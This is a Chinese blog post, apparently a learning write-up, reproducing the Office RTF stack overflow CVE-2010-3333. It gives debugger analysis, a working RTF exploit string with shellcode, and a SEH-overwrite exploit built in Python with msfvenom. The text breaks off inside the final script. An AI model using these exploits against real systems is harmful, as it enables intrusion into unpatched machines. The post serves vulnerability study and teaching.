<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="漏洞复现," />










<meta name="description" content="写在前面之前搞的二进制一直都是Linux下的，这是第一次复现Windows漏洞。整体思路是参考《漏洞战争》这本书。虽然看的blog或者书籍都说了是非常适合小白学习的教程，但只要自己亲自开始弄，无论别人的教程写的多么细致，调的过程中总会遇见更加新手的问题。所以还是要动手调，动手查资料，自己解决问题。写这篇blog的目的，一是补充一些我在看教程时候遇到的新手问题，方便其他小白；二是希望锻炼自己独立解决">
<meta name="keywords" content="漏洞复现">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2010-3333栈溢出漏洞复现新手向">
<meta property="og:url" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/index.html">
<meta property="og:site_name" content="0gur1">
<meta property="og:description" content="写在前面之前搞的二进制一直都是Linux下的，这是第一次复现Windows漏洞。整体思路是参考《漏洞战争》这本书。虽然看的blog或者书籍都说了是非常适合小白学习的教程，但只要自己亲自开始弄，无论别人的教程写的多么细致，调的过程中总会遇见更加新手的问题。所以还是要动手调，动手查资料，自己解决问题。写这篇blog的目的，一是补充一些我在看教程时候遇到的新手问题，方便其他小白；二是希望锻炼自己独立解决">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/1.png">
<meta property="og:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/2.png">
<meta property="og:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/3.png">
<meta property="og:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/4.png">
<meta property="og:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/5.png">
<meta property="og:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/6.png">
<meta property="og:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/7.png">
<meta property="og:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/8.png">
<meta property="og:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/9.png">
<meta property="og:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/a.png">
<meta property="og:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/b.png">
<meta property="og:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/d.png">
<meta property="og:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/c.png">
<meta property="og:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/g.png">
<meta property="og:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/h.png">
<meta property="og:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/i.png">
<meta property="og:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/j.png">
<meta property="og:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/k.png">
<meta property="og:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/l.png">
<meta property="og:updated_time" content="2019-02-16T11:43:12.540Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2010-3333栈溢出漏洞复现新手向">
<meta name="twitter:description" content="写在前面之前搞的二进制一直都是Linux下的，这是第一次复现Windows漏洞。整体思路是参考《漏洞战争》这本书。虽然看的blog或者书籍都说了是非常适合小白学习的教程，但只要自己亲自开始弄，无论别人的教程写的多么细致，调的过程中总会遇见更加新手的问题。所以还是要动手调，动手查资料，自己解决问题。写这篇blog的目的，一是补充一些我在看教程时候遇到的新手问题，方便其他小白；二是希望锻炼自己独立解决">
<meta name="twitter:image" content="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
	  applicationID: '7MHLMVVD1M',
      apiKey: 'dbb74cd528079f8c1d1a6138e9ed5b67',
      indexName: 'test_hexo',
      hits: "",
      labels: ""
    }
  };
</script>



  <link rel="canonical" href="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/"/>





  <title>CVE-2010-3333栈溢出漏洞复现新手向 | 0gur1</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">0gur1</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  <!-- -->
  
  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      

    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://0gur1.cc/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="0gur1">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0gur1">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">CVE-2010-3333栈溢出漏洞复现新手向</h1>
        

        <div class="post-meta">
		  
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-31T19:31:21+08:00">
                2019-01-31
              </time>
            

            

            
          </span>

          

          
            
          

          
          
             <span id="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/" class="leancloud_visitors" data-flag-title="CVE-2010-3333栈溢出漏洞复现新手向">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  4,112字
                </span>
              

              

              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>之前搞的二进制一直都是Linux下的，这是第一次复现Windows漏洞。整体思路是参考《漏洞战争》这本书。虽然看的blog或者书籍都说了是非常适合小白学习的教程，但只要自己亲自开始弄，无论别人的教程写的多么细致，调的过程中总会遇见更加新手的问题。所以还是要动手调，动手查资料，自己解决问题。写这篇blog的目的，一是补充一些我在看教程时候遇到的新手问题，方便其他小白；二是希望锻炼自己独立解决问题的能力。</p>
<p>在《漏洞战争》这本书里，写到CVE-2010-3333漏洞适用于Office2003和Office2007等多个版本，但是触发的原理不大相同，于是我就分别探究了两个版本的PoC。接下来写的顺序也是我自己的学习过程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2003版的PoC寻找漏洞点，根据PoC修改成EXP</span><br><span class="line"></span><br><span class="line">了解SEH，通过一个例子利用SEH</span><br><span class="line"></span><br><span class="line">2007版的PoC寻找漏洞点，根据PoC修改成EXP</span><br></pre></td></tr></table></figure>
<h1 id="Office-2003的漏洞复现"><a href="#Office-2003的漏洞复现" class="headerlink" title="Office 2003的漏洞复现"></a>Office 2003的漏洞复现</h1><h2 id="rtf文件格式"><a href="#rtf文件格式" class="headerlink" title="rtf文件格式"></a>rtf文件格式</h2><p>rtf形式上类似于xml，通过控制字编辑属性。从msf生成的msf.rtf来看，各个字段的含义如下：（来自漏洞战争）</p>
<blockquote>
<p>\rtf1：rtf版本</p>
<p>\shp：绘画对象</p>
<p>\*\shpinst：图片引用</p>
<p>\sp：绘画对象属性定义</p>
<p>\sn pFragments：定义属性名称，pFragments段是图形的附加部分，属于数组结构。允许图形包含多个路径和分段，该属性列出图形各个碎片</p>
<p>\sv：定义属性值</p>
</blockquote>
<p>更多的rtf文件知识参考<a href="https://zhuanlan.zhihu.com/p/31345299" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/31345299</a></p>
<h2 id="定位漏洞"><a href="#定位漏洞" class="headerlink" title="定位漏洞"></a>定位漏洞</h2><p>主要采用回溯函数调用关系来对漏洞定位。PoC为msf.rtf，是参照《漏洞战争》利用metasploit生成的。</p>
<p>1.打开word，以附加进程的方式使用windbg进行调试。这里pid是WINWORD.EXE对应的pid，-g参数是忽略掉初始断点，如果不加这一参数会停留在int 3处。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windbg.exe -g -p pid</span><br></pre></td></tr></table></figure>
<p>2.打开msf.rtf文件，windbg停在mso.dll中的30e9eb88处：</p>
<p><img src="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/1.png" alt=""></p>
<p>将这条指令简化成mov [edi]，[esi]。停在这里说明edi或者esi中的某个值不是合理地址，或者权限不对。用!address edi查看edi中地址的信息：</p>
<p><img src="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/2.png" alt=""></p>
<p>发现这个位置是只读权限，而mov这条指令要向其中写入内容，造成了程序崩溃。</p>
<p>结合IDA，查看30e9eb88所在函数是sub_30e9eb62。</p>
<p>3.关闭windbg，用windbg.exe -p pid再次附加到WINWORD.EXE，不加-g参数是为了方便设置断点。在30e9eb88设置断点，并用g命令让程序继续执行到断点：</p>
<p><img src="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/3.png" alt=""></p>
<p>打开msf.rtf，程序停在断点处，通过kv命令或者alt+6，查看函数调用栈：</p>
<p><img src="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/4.png" alt=""></p>
<p>当前执行的语句在第一行，即mso!Ordinal6463+0x64d，当前函数栈桢的ebp是00183d88，返回地址是30f4cdbd。这里windbg说明了“Following frames may be wrong”，信息未必完全准确，就暂且认为30f4cdbd之前调用了30e9eb88所属的sub_30e9eb62函数。由于函数在调用之前压入的返回地址是下一条指令，所以用ub命令查看30f4cdbd之前的汇编指令：</p>
<p><img src="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/5.png" alt=""></p>
<p>在30f4cdb8处，调用了一个函数，但这个函数并不是sub_30e9eb62。我在这里疑惑了很久，光猜是没什么用的，还是继续调才能解决问题。</p>
<p>4.用windbg.exe -p pid再次打开，在30f4cc5d设置断点，F10单步不步入运行。在30f4cc93处，call [eax+0x1c]显示的正是30e9eb62：</p>
<p><img src="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/6.png" alt=""></p>
<p>通过汇编查看调用该函数的参数：</p>
<p><img src="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/7.png" alt=""></p>
<p>其中第二个参数ecx为ebp-0x10，只要写入0x10+4+4个字节就能覆盖到返回地址。</p>
<p>F8步入到这个函数中执行，第二个参数赋值给了edi，而且在执行到30e9eb88之前，edi的值都没有发生变化。也能看到，这个函数进入的时候是push的edi，而不是ebp，可以猜想windbg是通过识别ebp来识别不同栈桢的，这也就是为什么30f4cc5d这个函数没有在kv中显示出来。</p>
<p><img src="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/8.png" alt=""></p>
<p>在30e9eb6f处，ecx被赋值为[eax+8]，这个值是在rtf文件中输入的acc8。</p>
<p><img src="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/9.png" alt=""></p>
<p>接着执行到30e9eb83，查看esi的内容：</p>
<p><img src="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/a.png" alt=""></p>
<p>esi的内容就是在rtf文件中acc8后面的乱码。也就是说要把esi中的这些乱码复制到edi对应的地址中，复制多少呢？rep的循环次数由ecx确定，ecx是0xc8a8/4（shr ecx,2），远大于edi对应的0x10大小（ebp-0x10），由此造成栈溢出。</p>
<p>6.总结一下就是，30f4cdbd处调用了<code>sub_30f4cc5d</code>函数；<code>sub_30f4cc5d</code>在30f4cc93处通过call [eax+0x1c]调用了<code>sub_30e9eb62</code>，且第二个参数为ebp-0x10；<code>sub_30e9eb62</code>在30e9eb88处将esi地址中的内容复制到edi地址中，复制的大小由pFragments中的数据指定，且没有对长度进行检查，造成栈溢出，而edi就是上一个函数<code>sub_30f4cc5d</code>传过来的参数ebp-0x10，这个ebp是<code>sub_30f4cc5d</code>的ebp，因此溢出结果会影响<code>sub_30f4cc5d</code>函数的返回。</p>
<h2 id="生成EXP"><a href="#生成EXP" class="headerlink" title="生成EXP"></a>生成EXP</h2><p>前面说到覆盖到返回地址需要0x14+4字节，rtf文件里写的是十六进制，也就是两个字符是一个字节，所以在acc8之后先随意填充0x14个字节，也就是40个字符，然后写入返回地址。在《漏洞战争》里返回地址覆盖成了jmp esp的地址。另外还要注意<code>sub_30f4cc5d</code>函数返回时用的是ret 14h指令，即ret之后再从栈中pop 0x14个字节，那么在返回地址之后再填充40个字符之后，写入shellcode即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;\rtf1&#123;&#125;&#123;\shp&#123;\*\shpinst&#123;\sp&#123;\sn pfragments&#125;&#123;\sv</span><br><span class="line">1;1;11111111222211111111111111111111111111111111111111111245fa7f00000000000000</span><br><span class="line">0000000000000000000000000031d2b230648b128b520c8b521c8b42088b72208b12807e0c337</span><br><span class="line">5f289c703783c8b577801c28b7a2001c731ed8b34af01c645813e4661746175f2817e0845786974</span><br><span class="line">75e98b7a2401c7668b2c6f8b7a1c01c78b7caffc01c76879202001686661697268204e657489e1fe</span><br><span class="line">490b31c05150ffd7&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h1 id="SEH知识及利用"><a href="#SEH知识及利用" class="headerlink" title="SEH知识及利用"></a>SEH知识及利用</h1><p>由于Office2007的利用会用到SEH的知识，因此先了解一下SEH。</p>
<h2 id="关于SEH"><a href="#关于SEH" class="headerlink" title="关于SEH"></a>关于SEH</h2><p>SEH是windows中的异常处理例程。SEH包含两个结构：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">next SEH    指向下一个SEH</span><br><span class="line">SEH handler 指向处理异常的函数</span><br></pre></td></tr></table></figure>
<p>通常我们在编写程序时会用try……catch……捕捉并处理异常，执行时就会生成SEH结构，并压入到当前的函数栈桢中。windows系统有默认的异常处理函数，就是常见的弹框提示XX程序停止运行。</p>
<p><img src="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/b.png" alt=""></p>
<p>程序中的SEH结构以单向链表的形式组织起来，最后一个SEH结构的next SEH为0xffffffff，SEH handler 为windows的异常处理函数。</p>
<p>当程序发生异常时，KiUserExceptionDispatcher函数调用RtlDispatchException函数对线程的SEH链进行遍历，如果找到能够处理异常的回调函数，进行unwind操作将之前的SEH结构体从链表中拆除，并执行当前SEH的异常处理函数。如果线程的SEH不能处理这个异常，且用户曾使用SetUnhandledExceptionFilter注册过进程异常处理，则调用之；否则调用Windows默认的异常处理函数。</p>
<p>异常处理函数SEH handler的参数有4个</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pExcept:指向一个结构体EXCEPTION_RECORD</span><br><span class="line">pFrame:指向SEH结构体</span><br><span class="line">pContext:指向Context结构体，记录了寄存器的状态</span><br><span class="line">pDispatch</span><br></pre></td></tr></table></figure>
<h2 id="SEH的利用"><a href="#SEH的利用" class="headerlink" title="SEH的利用"></a>SEH的利用</h2><p>由于SEH结构都是存放在栈中，栈溢出漏洞能够对其进行利用。</p>
<p>先来调一个小程序seh_test.exe，来自<a href="https://bbs.pediy.com/thread-208596.htm" target="_blank" rel="noopener">Netfairy师傅的教程第三篇</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(buf,str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FILE *fp;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">30000</span>];</span><br><span class="line">	LoadLibrary(<span class="string">"Netfairy.dll"</span>);</span><br><span class="line">	<span class="keyword">if</span>((fp=fopen(<span class="string">"test.txt"</span>,<span class="string">"r"</span>))==<span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\nFile can not open!"</span>);</span><br><span class="line">		getchar();</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(!feof(fp))</span><br><span class="line">		&#123;</span><br><span class="line">			str[i]=fgetc(fp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	test(str);</span><br><span class="line">	fclose(fp);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>程序中向str中读入文件内容，如果test.txt内容超过30000字节，将有机会溢出到SEH结构，在strcpy后会将test函数的返回地址覆盖，进而触发异常，执行我们构造好的SEH handler。</p>
<p>1.用windbg打开seh_test.exe，在main函数中设置断点，!exchain命令查看正常的SEH链。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !exchain</span><br><span class="line">006fffcc: ntdll!_except_handler4+0 (77342bd0)</span><br><span class="line">  CRT scope  0, filter: ntdll!__RtlUserThreadStart+39ce3 (7736d76c)</span><br><span class="line">                func:   ntdll!__RtlUserThreadStart+39d2a (7736d7b3)</span><br><span class="line">006fffe4: ntdll!FinalExceptionHandlerPad24+0 (7734f308)</span><br><span class="line">Invalid exception stack at ffffffff</span><br></pre></td></tr></table></figure>
<p>可见正常的SEH链是从0x6fffcc开始的，可以通过栈溢出修改这里的next SEH和SEH handler。</p>
<p>利用的步骤是：确定填充字节数-&gt;修改handler为pop,pop,ret的地址；next SEH为jmp 6-&gt;构造shellcode</p>
<p>2.填充字节数</p>
<p>为了方便确定字节数，写了一个产生随机字符的python脚本，由此生成test.txt。脚本中先将str的30000个字符填充为a后，之后的数据用随机字符填充。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_random_str</span><span class="params">(randomlength=<span class="number">16</span>)</span>:</span></span><br><span class="line">	random_str = <span class="string">''</span></span><br><span class="line">	base_str = <span class="string">'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'</span></span><br><span class="line">	length = len(base_str) - <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(randomlength):</span><br><span class="line">		random_str += base_str[random.randint(<span class="number">0</span>, length)]</span><br><span class="line">	<span class="keyword">return</span> random_str</span><br><span class="line">payload =<span class="number">30000</span>*<span class="string">'a'</span>+generate_random_str(<span class="number">1000</span>)</span><br></pre></td></tr></table></figure>
<p>在test的401513设置断点并用!exchain查看SEH中内容 。</p>
<p>这里遇到一个坑，因为使用dev-c++编译的，它的编译器总是把char数组放在高地址，所以str溢出的话会覆盖其他变量，包括fp。为了让feof正常进行，要把fp覆盖成原本的地址。在main的4015b1设置断点，fp的地址为ebp-0x10，查看其值并修改payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =<span class="number">30000</span>*<span class="string">'a'</span>+<span class="string">'\x60\x46\xc8\x74'</span>+generate_random_str(<span class="number">1000</span>)</span><br></pre></td></tr></table></figure>
<p>查看SEH：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !exchain</span><br><span class="line">006fffcc: 77686c69</span><br><span class="line">Invalid exception stack at 74305168</span><br></pre></td></tr></table></figure>
<p>即next SEH被修改为74305168，即t0Qh，由于是小端模式，实际为hQ0t。在test.txt里查找hQ0t，其偏移为30242</p>
<p><img src="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/d.png" alt=""></p>
<p>修改payload为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =<span class="number">30000</span>*<span class="string">'a'</span>+<span class="string">'\x60\x46\xc8\x74'</span>+<span class="number">238</span>*<span class="string">'b'</span>+<span class="string">'\x90\x90\x90\x90'</span><span class="comment">#先将SEH填为nop</span></span><br></pre></td></tr></table></figure>
<p>在windbg里选择restart，发现这个长度不足以覆盖到SEH，根据调试情况修改payload长度，最终填充为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =<span class="number">30000</span>*<span class="string">'a'</span>+<span class="string">'\x60\x46\xc8\x74'</span>+<span class="number">257</span>*<span class="string">'b'</span>+<span class="string">'\x90\x90\x90\x90'</span><span class="comment">#先将SEH填为nop</span></span><br></pre></td></tr></table></figure>
<p>3.修改SEH</p>
<p>之所以修改handler为gadget地址，是因为前面提到，异常处理函数有4个参数，其中第二个就是SEH结构体pFrame。也就是说在执行handler时，栈上有一个返回地址和4个参数，前两个pop弹出了返回地址和pExcept，ret对应的就是pFrame的地址，也就是回到了当前SEH结构体在栈中的地址。这个地址也对应于next SEH字段的地址。</p>
<p>在next SEH位置写入jmp 6（eb 06）指令，jmp 6是由于执行到6fffcc时，eip为下一条指令地址即6fffce，jmp 6相当于eip + 6，即eip= 6fffd4。即接下来就会去执行SEH结构体之后的shellcode。<br><img src="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/c.png" alt=""></p>
<p>由于大部分库都加入了safeseh的保护机制，所以需要找一个没有safeseh且有poppopret指令的二进制文件。因为执行到SEH handler时，如果handler所在的模块开了safeseh，这个机制会检查handler的地址是否属于该dll的SEH映射表（gadget的地址肯定不在表里），如果不在就会终止异常。safeSEH细节，参考<a href="https://blog.csdn.net/whatday/article/details/82976677" target="_blank" rel="noopener">safeseh</a>。这里用的是师傅自己写的dll。</p>
<p>考虑到shellcode长度较大，把shellcode写在前面30000字节中，然后在6fffd4中用jmp跳转到shellcode处。这里需要注意的是jmp分为short near和far，eb 06就属于short短跳转；如果超过两个字节但在同一个段里，用e9 near近跳转；如果已经不在一个段里，就用ea far远跳转。这里要用e9，而且jmp后面的参数也是以小端形式写入的。<br>4.生成shellcode<br>由于本程序是32位的，所以shellcode也要用x86的payload，metasploit生成shellcode：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/messagebox TEXT=<span class="string">"hello world!"</span> -b <span class="string">"\x00\x1a"</span> -f python</span><br></pre></td></tr></table></figure>
<p>5.最终的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">filename=<span class="string">"test.txt"</span></span><br><span class="line">myfile=open(filename,<span class="string">'w'</span>) </span><br><span class="line">buf =  <span class="string">""</span></span><br><span class="line">buf += <span class="string">"\xba\xbd\xef\xb1\xd3\xda\xd9\xd9\x74\x24\xf4\x5e\x33"</span></span><br><span class="line">buf += <span 